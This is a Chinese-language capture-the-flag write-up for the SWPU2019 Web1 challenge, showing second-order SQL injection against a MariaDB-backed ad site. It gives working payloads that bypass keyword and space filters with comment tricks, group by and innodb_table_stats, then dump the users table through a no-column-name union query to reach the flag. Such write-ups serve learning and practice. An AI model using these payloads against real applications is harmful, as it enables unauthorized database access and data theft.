---
title: SWPU2019-Web1
date: 2025-03-29 01:32:39
tags:
- sql注入
- 二次注入
- 无列名注入
- MariaDB数据库
category:
- 刷题笔记
---

# SWPU2019-Web1

 既然这道题是个二次注入的题目，那么就应该考虑，使用sql注入的方式了。首先构造语句，判断注入类型以及想办法清楚到底过滤了那些关键字，首先构造sql语句，之后申请，然后广告详情：

```
1'
```

得到了

    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ limit 0,1’ at line 1
判断这里存在二次注入，测试过滤

    or , # , 空格 , order by ，information_schema

 对于空格而言，则可以使用/**/来绕过，order by则可以使用group by ，#则可以使用,'3来闭合后面的引号来绕过，另外，information_schema 则可以使用最开始说到的无列名注入的相关的知识了，通过InnoDb引擎查表名，第一个payload为：

```
1'/**/group/**/by/**/22,'3
```

 首先，构造的group by后面的整数位22的时候，没有出现错误，但是，当整数为23的时候，却出现了报错：

在这里插入图片描述

 大致可以推测出，字段总的有22个。

 那么，知道了总的有多少个字段之后，就可以试着获得数据库名和表名了，构造的payload分别为：

 首先通过构造如下payload获取回显点，最后发现，回显点是2，3

```
-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

 获得数据库名，成功拿到数据库为web1：

```
1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/' 
```

 获得表名：

```
1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
```

 最后确定，web1这个数据库中存在的表为如下：

 根据dalao们的wp，他们使用的都是users这个表，因此，这里就不用一个表一个表地查了，直接users这个表梭哈：

```
1'/**/union/**/select/**/1,		(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
```

 该payload是利用了上面说到的无列名地union方法进行的，当然，为啥确定users表中存在3个字段呢？因为经过试错，发现一个字段，两个字段以及四个以上的时候，均是报错，所以，可以利用这一点，进行查询，然后通过

 然后通过修改as b 所在的地方，比如1的后方或者2的后方对列进行查找，最后发现在第三列查到了flag：

